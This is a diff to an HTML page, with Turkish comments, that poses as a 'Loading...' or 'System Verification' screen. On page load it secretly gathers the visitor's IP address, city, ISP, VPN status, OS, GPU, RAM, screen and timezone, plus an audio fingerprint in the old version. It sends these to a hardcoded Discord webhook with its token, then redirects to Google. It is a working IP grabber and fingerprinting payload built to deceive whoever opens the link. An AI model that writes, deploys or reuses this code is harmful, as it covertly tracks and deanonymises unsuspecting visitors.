@@ -2,173 +2,80 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Loading</title>
+    <title>Loading...</title>
     <style>
-        /* Sayfa Düzeni */
-        body { 
-            background-color: #000; 
-            color: #0f0; 
-            font-family: 'Courier New', monospace; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden; 
-        }
-        /* Yükleniyor Çarkı */
-        .loader { 
-            border: 4px solid #111; 
-            border-top: 4px solid #0f0; 
-            border-radius: 50%; 
-            width: 50px; 
-            height: 50px; 
-            animation: spin 1s linear infinite; 
-            margin-bottom: 20px; 
-        }
-        .status { font-size: 14px; opacity: 0.8; letter-spacing: 2px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .c { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <div class="status" id="log_display">SYSTEM VERIFICATION...</div>
-
+    <div class="c"></div>
     <script>
-        // Hata ayıklama modunu kapat
         "use strict";
 
-        // --- AYARLAR ---
-        const CONFIG = {
-            webhook: "[https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL](https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL)",
-            redirect: "[https://www.google.com](https://www.google.com)"
-        };
+        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
 
-        // UI Güncelleme
-        const updateLog = (text) => document.getElementById('log_display').innerText = text;
-
-        // 1. SES İMZASI (Hata korumalı döngü)
-        async function getAudioSig() {
-            try {
-                const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-                if (!AudioContext) return "No Audio API";
-
-                const ctx = new AudioContext(1, 44100, 44100);
-                const osc = ctx.createOscillator();
-                osc.type = "triangle";
-                osc.frequency.setValueAtTime(10000, ctx.currentTime);
-                
-                const compress = ctx.createDynamicsCompressor();
-                osc.connect(compress);
-                compress.connect(ctx.destination);
-                
-                osc.start(0);
-                const buffer = await ctx.startRendering();
-                const data = buffer.getChannelData(0);
-                
-                let sum = 0;
-                // HTML hatasını önlemek için güvenli döngü
-                for (let i = 0; i < 500 && i < data.length; i++) {
-                    sum += Math.abs(data[i]);
-                }
-                return "SIG-" + sum.toFixed(4).replace('.', '');
-            } catch (e) { return "Audio Blocked"; }
-        }
-
-        // 2. ANA FONKSİYON
-        async function runProtocol() {
-            updateLog("ANALYZING HARDWARE ID...");
-
-            // Veri Objeleri
-            let sys = { 
-                os: "Unknown", 
-                gpu: "Integrated/Masked", 
-                cores: navigator.hardwareConcurrency || 2,
-                ram: navigator.deviceMemory || 4
+        async function collect() {
+            // 1. Temel Veriler
+            let info = {
+                os: navigator.platform,
+                browser: navigator.userAgent.split(' ').pop(),
+                res: `${screen.width}x${screen.height}`,
+                lang: navigator.language,
+                mem: navigator.deviceMemory || "N/A",
+                cores: navigator.hardwareConcurrency || "N/A",
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // OS Tespiti
-            if (navigator.userAgent.indexOf("Win") !== -1) sys.os = "Windows";
-            else if (navigator.userAgent.indexOf("Mac") !== -1) sys.os = "MacOS";
-            else if (navigator.userAgent.indexOf("Linux") !== -1) sys.os = "Linux";
-            else if (navigator.userAgent.indexOf("Android") !== -1) sys.os = "Android";
-            else if (navigator.userAgent.indexOf("like Mac") !== -1) sys.os = "iOS";
-
-            // GPU Tespiti
+            // 2. GPU Tespiti (Raw)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                if (gl) {
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    if(dbg) sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                }
-            } catch(e) {}
+                const gl = canvas.getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+            } catch(e) { info.gpu = "Masked"; }
 
-            updateLog("ESTABLISHING UPLINK...");
-            
-            // IP ve Konum
-            let net = { ip: "N/A", loc: "Unknown", vpn: "Clean" };
-            const localTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
+            // 3. IP ve VPN (En Hızlı Servis)
             try {
-                const req = await fetch('[https://ipapi.co/json/](https://ipapi.co/json/)');
-                const j = await req.json();
-                net.ip = j.ip;
-                net.loc = `${j.city}, ${j.country_name}`;
-                
-                if (j.timezone !== localTz) {
-                    net.vpn = `🚨 VPN ACTIVE (IP: ${j.timezone} / Sys: ${localTz})`;
-                }
-            } catch(e) { net.ip = "Connection Error"; }
+                const res = await fetch('https://ipapi.co/json/');
+                const j = await res.json();
+                info.ip = j.ip;
+                info.loc = `${j.city} / ${j.country_name}`;
+                info.isp = j.org;
+                info.is_vpn = (j.timezone !== info.tz) ? "🚨 YES" : "✅ NO";
+            } catch(e) { info.ip = "Blocked"; }
 
-            // Ses İmzasını Al
-            const audioHash = await getAudioSig();
-
-            // PAYLOAD OLUŞTURMA
+            // 4. DISCORD PAYLOAD (JSON Format)
             const payload = {
-                username: "System Monitor",
                 embeds: [{
-                    title: "💀 NEW DEVICE DETECTED",
-                    color: net.vpn.includes("🚨") ? 15158332 : 3066993,
+                    title: "💀 DEVICE DATA EXTRACTED",
+                    color: 3066993,
                     fields: [
-                        { name: "📡 NETWORK", value: `**IP:** \`${net.ip}\`\n**Loc:** ${net.loc}\n**VPN:** ${net.vpn}`, inline: false },
-                        { name: "💻 DEVICE", value: `**OS:** ${sys.os}\n**CPU:** ${sys.cores} Cores\n**RAM:** ~${sys.ram} GB\n**GPU:** ${sys.gpu}`, inline: false },
-                        { name: "🔐 FINGERPRINT", value: `**Audio Sig:** \`${audioHash}\`\n**Time:** ${new Date().toLocaleTimeString()}`, inline: false }
-                    ]
+                        { name: "📡 Network", value: `**IP:** ${info.ip}\n**Loc:** ${info.loc}\n**VPN:** ${info.is_vpn}`, inline: true },
+                        { name: "⚙️ System", value: `**OS:** ${info.os}\n**GPU:** ${info.gpu}\n**RAM:** ${info.mem}GB`, inline: false },
+                        { name: "🌐 Browser", value: `**TZ:** ${info.tz}\n**Lang:** ${info.lang}\n**Res:** ${info.res}`, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
                 }]
             };
 
-            updateLog("SYNCING DATA...");
-
-            // GÖNDERİM (Fetch + Beacon)
-            const json = JSON.stringify(payload);
+            // 5. GÖNDERİM (En Garanti Yöntem: sendBeacon)
+            // fetch() bazen CORS hatası verir ama sendBeacon() tarayıcı seviyesinde gönderir.
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
             
-            try {
-                // Öncelik 1: Beacon (Sayfa kapansa da gider)
-                navigator.sendBeacon(CONFIG.webhook, new Blob([json], {type: 'application/json'}));
-            } catch(e) {}
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(WEBHOOK_URL, blob);
+            } else {
+                // Fallback (Yedek)
+                fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: blob });
+            }
 
-            try {
-                // Öncelik 2: Fetch (Yedek)
-                await fetch(CONFIG.webhook, {
-                    method: 'POST',
-                    mode: 'cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: json
-                });
-            } catch(e) {}
-
-            // YÖNLENDİRME
-            updateLog("COMPLETE.");
-            setTimeout(() => {
-                window.location.href = CONFIG.redirect;
-            }, 1500);
+            // 6. YÖNLENDİRME
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
         }
 
-        // Başlat
-        window.onload = runProtocol;
+        window.onload = collect;
     </script>
 </body>
 </html>
